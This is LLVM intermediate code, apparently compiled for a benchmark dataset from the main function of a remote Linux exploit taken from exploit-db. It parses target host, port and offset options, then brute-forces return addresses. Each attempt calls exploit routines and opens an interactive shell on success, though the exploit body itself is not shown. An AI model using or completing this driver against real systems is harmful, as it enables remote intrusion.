; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_398.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_398.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i8*, i64, i32, i32, i32, i32, i32, i8*, i8* }

@.str = private unnamed_addr constant [10 x i8] c"localhost\00", align 1
@rsx = common dso_local global %struct.TYPE_2__ zeroinitializer, align 8
@PORT = common dso_local global i8* null, align 8
@NULL_OFFSET = common dso_local global i64 0, align 8
@BRUTEBASE = common dso_local global i32 0, align 4
@ALLIGN = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [14 x i8] c"h:p:m:o:b:Ba:\00", align 1
@EOF = common dso_local global i8 0, align 1
@optarg = common dso_local global i8* null, align 8
@stderr = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [29 x i8] c"allign > 4 !? using default\0A\00", align 1
@STARTNULLBRUTE = common dso_local global i64 0, align 8
@ENDNULLBRUTE = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [13 x i8] c"\0Aoffset: %d\0A\00", align 1
@.str.4 = private unnamed_addr constant [11 x i8] c"poop..bye\0A\00", align 1
@INCREMENT = common dso_local global i64 0, align 8
@.str.5 = private unnamed_addr constant [15 x i8] c"No luck...bye\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8, align 1
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %9 = load i32, i32* %4, align 4
  %10 = icmp eq i32 %9, 1
  br i1 %10, label %11, label %16

11:                                               ; preds = %2
  %12 = load i8**, i8*** %5, align 8
  %13 = getelementptr inbounds i8*, i8** %12, i64 0
  %14 = load i8*, i8** %13, align 8
  %15 = call i32 @usage(i8* %14)
  br label %16

16:                                               ; preds = %11, %2
  store i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0), i8** getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 0), align 8
  %17 = load i8*, i8** @PORT, align 8
  store i8* %17, i8** getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 7), align 8
  %18 = load i64, i64* @NULL_OFFSET, align 8
  store i64 %18, i64* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 1), align 8
  %19 = load i32, i32* @BRUTEBASE, align 4
  store i32 %19, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 2), align 8
  store i32 0, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 3), align 4
  %20 = load i8*, i8** @ALLIGN, align 8
  %21 = ptrtoint i8* %20 to i32
  store i32 %21, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 4), align 8
  br label %22

22:                                               ; preds = %71, %16
  %23 = load i32, i32* %4, align 4
  %24 = load i8**, i8*** %5, align 8
  %25 = call signext i8 @getopt(i32 %23, i8** %24, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.1, i64 0, i64 0))
  store i8 %25, i8* %6, align 1
  %26 = sext i8 %25 to i32
  %27 = load i8, i8* @EOF, align 1
  %28 = sext i8 %27 to i32
  %29 = icmp ne i32 %26, %28
  br i1 %29, label %30, label %72

30:                                               ; preds = %22
  %31 = load i8, i8* %6, align 1
  %32 = sext i8 %31 to i32
  switch i32 %32, label %66 [
    i32 104, label %33
    i32 112, label %35
    i32 109, label %38
    i32 111, label %40
    i32 98, label %44
    i32 66, label %53
    i32 97, label %54
  ]

33:                                               ; preds = %30
  %34 = load i8*, i8** @optarg, align 8
  store i8* %34, i8** getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 0), align 8
  br label %71

35:                                               ; preds = %30
  %36 = load i8*, i8** @optarg, align 8
  %37 = call i8* @atoi(i8* %36)
  store i8* %37, i8** getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 7), align 8
  br label %71

38:                                               ; preds = %30
  %39 = load i8*, i8** @optarg, align 8
  store i8* %39, i8** getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 8), align 8
  br label %71

40:                                               ; preds = %30
  %41 = load i8*, i8** @optarg, align 8
  %42 = call i8* @atoi(i8* %41)
  %43 = ptrtoint i8* %42 to i64
  store i64 %43, i64* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 1), align 8
  br label %71

44:                                               ; preds = %30
  %45 = load i8*, i8** @optarg, align 8
  %46 = load i8*, i8** @optarg, align 8
  %47 = bitcast i8* %46 to i8**
  %48 = load i8*, i8** @optarg, align 8
  %49 = call i32 @strlen(i8* %48)
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8*, i8** %47, i64 %50
  %52 = call i32 @strtoul(i8* %45, i8** %51, i32 16)
  store i32 %52, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 2), align 8
  br label %71

53:                                               ; preds = %30
  store i32 1, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 3), align 4
  br label %71

54:                                               ; preds = %30
  %55 = load i8*, i8** @optarg, align 8
  %56 = call i8* @atoi(i8* %55)
  %57 = ptrtoint i8* %56 to i32
  store i32 %57, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 4), align 8
  %58 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 4), align 8
  %59 = icmp sgt i32 %58, 4
  br i1 %59, label %60, label %65

60:                                               ; preds = %54
  %61 = load i32, i32* @stderr, align 4
  %62 = call i32 (i32, i8*, ...) @fprintf(i32 %61, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.2, i64 0, i64 0))
  %63 = load i8*, i8** @ALLIGN, align 8
  %64 = ptrtoint i8* %63 to i32
  store i32 %64, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 4), align 8
  br label %65

65:                                               ; preds = %60, %54
  br label %71

66:                                               ; preds = %30
  %67 = load i8**, i8*** %5, align 8
  %68 = getelementptr inbounds i8*, i8** %67, i64 0
  %69 = load i8*, i8** %68, align 8
  %70 = call i32 @usage(i8* %69)
  br label %71

71:                                               ; preds = %66, %65, %53, %44, %40, %38, %35, %33
  br label %22

72:                                               ; preds = %22
  %73 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 2), align 8
  store i32 %73, i32* %8, align 4
  %74 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 3), align 4
  %75 = icmp ne i32 %74, 0
  br i1 %75, label %76, label %124

76:                                               ; preds = %72
  %77 = load i64, i64* @STARTNULLBRUTE, align 8
  store i64 %77, i64* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 1), align 8
  br label %78

78:                                               ; preds = %120, %76
  %79 = load i64, i64* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 1), align 8
  %80 = load i64, i64* @ENDNULLBRUTE, align 8
  %81 = icmp sge i64 %79, %80
  br i1 %81, label %82, label %123

82:                                               ; preds = %78
  %83 = load i32, i32* @stderr, align 4
  %84 = load i64, i64* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 1), align 8
  %85 = call i32 (i32, i8*, ...) @fprintf(i32 %83, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.3, i64 0, i64 0), i64 %84)
  store i32 1, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 5), align 4
  br label %86

86:                                               ; preds = %112, %82
  %87 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 2), align 8
  %88 = icmp ule i32 %87, -1073741825
  br i1 %88, label %89, label %118

89:                                               ; preds = %86
  %90 = load i8*, i8** getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 0), align 8
  %91 = load i8*, i8** getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 7), align 8
  %92 = call i32 @open_s(i8* %90, i8* %91)
  store i32 %92, i32* %7, align 4
  %93 = icmp slt i32 %92, 0
  br i1 %93, label %94, label %98

94:                                               ; preds = %89
  %95 = load i32, i32* @stderr, align 4
  %96 = call i32 (i32, i8*, ...) @fprintf(i32 %95, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.4, i64 0, i64 0))
  %97 = call i32 @exit(i32 1) #3
  unreachable

98:                                               ; preds = %89
  %99 = load i32, i32* %7, align 4
  %100 = call i64 @setup(i32 %99)
  %101 = icmp sgt i64 %100, 0
  br i1 %101, label %102, label %111

102:                                              ; preds = %98
  %103 = load i32, i32* %7, align 4
  %104 = call i64 @exploit(i32 %103)
  %105 = icmp sgt i64 %104, 0
  br i1 %105, label %106, label %110

106:                                              ; preds = %102
  %107 = load i32, i32* %7, align 4
  %108 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 6), align 8
  %109 = call i32 @handleshell(i32 %107, i32 %108)
  br label %110

110:                                              ; preds = %106, %102
  br label %111

111:                                              ; preds = %110, %98
  br label %112

112:                                              ; preds = %111
  %113 = load i64, i64* @INCREMENT, align 8
  %114 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 2), align 8
  %115 = sext i32 %114 to i64
  %116 = add nsw i64 %115, %113
  %117 = trunc i64 %116 to i32
  store i32 %117, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 2), align 8
  br label %86

118:                                              ; preds = %86
  %119 = load i32, i32* %8, align 4
  store i32 %119, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 2), align 8
  br label %120

120:                                              ; preds = %118
  %121 = load i64, i64* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 1), align 8
  %122 = add nsw i64 %121, -1
  store i64 %122, i64* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 1), align 8
  br label %78

123:                                              ; preds = %78
  br label %124

124:                                              ; preds = %123, %72
  store i32 1, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 5), align 4
  br label %125

125:                                              ; preds = %151, %124
  %126 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 2), align 8
  %127 = icmp ule i32 %126, -1073741825
  br i1 %127, label %128, label %157

128:                                              ; preds = %125
  %129 = load i8*, i8** getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 0), align 8
  %130 = load i8*, i8** getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 7), align 8
  %131 = call i32 @open_s(i8* %129, i8* %130)
  store i32 %131, i32* %7, align 4
  %132 = icmp slt i32 %131, 0
  br i1 %132, label %133, label %137

133:                                              ; preds = %128
  %134 = load i32, i32* @stderr, align 4
  %135 = call i32 (i32, i8*, ...) @fprintf(i32 %134, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.4, i64 0, i64 0))
  %136 = call i32 @exit(i32 1) #3
  unreachable

137:                                              ; preds = %128
  %138 = load i32, i32* %7, align 4
  %139 = call i64 @setup(i32 %138)
  %140 = icmp sgt i64 %139, 0
  br i1 %140, label %141, label %150

141:                                              ; preds = %137
  %142 = load i32, i32* %7, align 4
  %143 = call i64 @exploit(i32 %142)
  %144 = icmp sgt i64 %143, 0
  br i1 %144, label %145, label %149

145:                                              ; preds = %141
  %146 = load i32, i32* %7, align 4
  %147 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 6), align 8
  %148 = call i32 @handleshell(i32 %146, i32 %147)
  br label %149

149:                                              ; preds = %145, %141
  br label %150

150:                                              ; preds = %149, %137
  br label %151

151:                                              ; preds = %150
  %152 = load i64, i64* @INCREMENT, align 8
  %153 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 2), align 8
  %154 = sext i32 %153 to i64
  %155 = add nsw i64 %154, %152
  %156 = trunc i64 %155 to i32
  store i32 %156, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 2), align 8
  br label %125

157:                                              ; preds = %125
  %158 = load i32, i32* @stderr, align 4
  %159 = call i32 (i32, i8*, ...) @fprintf(i32 %158, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.5, i64 0, i64 0))
  %160 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @usage(i8*) #1

declare dso_local signext i8 @getopt(i32, i8**, i8*) #1

declare dso_local i8* @atoi(i8*) #1

declare dso_local i32 @strtoul(i8*, i8**, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @open_s(i8*, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @setup(i32) #1

declare dso_local i64 @exploit(i32) #1

declare dso_local i32 @handleshell(i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
